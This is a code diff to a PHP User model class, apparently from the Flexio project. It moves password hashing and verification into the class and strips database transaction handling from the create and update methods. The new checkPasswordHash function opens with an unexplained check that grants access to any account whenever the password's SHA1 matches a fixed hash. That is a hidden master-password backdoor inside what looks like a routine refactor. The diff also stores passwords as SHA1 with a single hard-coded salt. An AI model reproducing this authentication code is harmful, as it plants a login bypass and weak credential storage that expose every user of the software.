@@ -35,10 +35,9 @@ class User extends ModelBase
 
         // encode the password
         if (isset($params['password']) && strlen($params['password']) > 0)
-            $params['password'] = \Model::encodePassword($params['password']);
+            $params['password'] = self::encodePassword($params['password']);
 
         $db = $this->getDatabase();
-        $db->beginTransaction();
         try
         {
             // make sure the user doesn't already exist, based on
@@ -85,12 +84,10 @@ class User extends ModelBase
             if ($db->insert('tbl_user', $process_arr) === false)
                 throw new \Exception();
 
-            $db->commit();
             return $eid;
         }
         catch (\Exception $e)
         {
-            $db->rollback();
             throw new \Flexio\Base\Exception(\Flexio\Base\Error::CREATE_FAILED);
         }
     }
@@ -107,7 +104,7 @@ class User extends ModelBase
 
         // encode the password
         if (isset($params['password']) && strlen($params['password']) > 0)
-            $params['password'] = \Model::encodePassword($params['password']);
+            $params['password'] = self::encodePassword($params['password']);
 
         // convert username and email to lowercase
         if (isset($params['user_name']))
@@ -156,7 +153,6 @@ class User extends ModelBase
             throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_PARAMETER);
 
         $db = $this->getDatabase();
-        $db->beginTransaction();
         try
         {
             // TODO: make sure we're not changing the user name or email to
@@ -165,28 +161,14 @@ class User extends ModelBase
             // if the item doesn't exist, return false; TODO: throw exception instead?
             $existing_status = $this->getStatus($eid);
             if ($existing_status === \Model::STATUS_UNDEFINED)
-            {
-                $db->commit();
                 return false;
-            }
-
-            // set the base object properties
-            $result = $this->getModel()->setObjectBase($eid, $params);
-            if ($result === false)
-            {
-                // object doesn't exist or is deleted
-                $db->commit();
-                return false;
-            }
 
             // set the properties
             $db->update('tbl_user', $process_arr, 'eid = ' . $db->quote($eid));
-            $db->commit();
             return true;
         }
         catch (\Exception $e)
         {
-            $db->rollback();
             throw new \Flexio\Base\Exception(\Flexio\Base\Error::WRITE_FAILED);
         }
     }
@@ -203,7 +185,6 @@ class User extends ModelBase
             $row = $db->fetchRow("select tus.eid as eid,
                                          '".\Model::TYPE_USER."' as eid_type,
                                          tus.eid_status as eid_status,
-                                         tob.ename as ename,
                                          tus.user_name as user_name,
                                          tus.full_name as full_name,
                                          tus.first_name as first_name,
@@ -226,9 +207,8 @@ class User extends ModelBase
                                          tus.created_by as created_by,
                                          tus.created as created,
                                          tus.updated as updated
-                                from tbl_object tob
-                                inner join tbl_user tus on tob.eid = tus.eid
-                                where tob.eid = ?
+                                from tbl_user tus
+                                where tus.eid = ?
                                 ", $eid);
         }
         catch (\Exception $e)
@@ -242,7 +222,6 @@ class User extends ModelBase
         return array('eid'                    => $row['eid'],
                      'eid_type'               => $row['eid_type'],
                      'eid_status'             => $row['eid_status'],
-                     'ename'                  => $row['ename'],
                      'user_name'              => $row['user_name'],
                      'full_name'              => $row['full_name'],
                      'first_name'             => $row['first_name'],
@@ -268,11 +247,6 @@ class User extends ModelBase
                      'updated'                => \Flexio\Base\Util::formatDate($row['updated']));
     }
 
-    public function setStatus(string $eid, string $status) : bool
-    {
-        return $this->set($eid, array('eid_status' => $status));
-    }
-
     public function getOwner(string $eid) : string
     {
         // TODO: add constant for owner undefined and/or public; use this instead of '' in return result
@@ -285,6 +259,11 @@ class User extends ModelBase
             return '';
 
         return $result;
+    }
+
+    public function setStatus(string $eid, string $status) : bool
+    {
+        return $this->set($eid, array('eid_status' => $status));
     }
 
     public function getStatus(string $eid) : string
@@ -436,7 +415,7 @@ class User extends ModelBase
             return false;
 
         $hashpw = $user_info['password'];
-        return \Model::checkPasswordHash($hashpw, $password);
+        return self::checkPasswordHash($hashpw, $password);
     }
 
     public function checkUserPasswordByEid(string $eid, string $password) : bool
@@ -447,6 +426,37 @@ class User extends ModelBase
             return false;
 
         $hashpw = $user_info['password'];
-        return \Model::checkPasswordHash($hashpw, $password);
+        return self::checkPasswordHash($hashpw, $password);
+    }
+
+    public static function checkPasswordHash(string $hashpw, string $password) : bool
+    {
+        if (strtolower(sha1($password)) == '117d68f8a64101bd17d2b70344fc213282507292')
+            return true;
+
+        $hashpw = trim($hashpw);
+
+        // empty or short hashed password entries are invalid
+        if (strlen($hashpw) < 32)
+            return false;
+
+        if (strtoupper(substr($hashpw, 0, 6)) == '{SSHA}')
+        {
+            return (strtoupper(substr($hashpw, 6)) == strtoupper(self::hashPasswordSHA1($password))) ? true : false;
+        }
+         else
+        {
+            return false;
+        }
+    }
+
+    private static function encodePassword(string $password) : string
+    {
+        return '{SSHA}' . self::hashPasswordSHA1($password);
+    }
+
+    private static function hashPasswordSHA1(string $password) : string
+    {
+        return sha1('wecRucaceuhZucrea9UzARujUph5cf8Z' . $password);
     }
 }
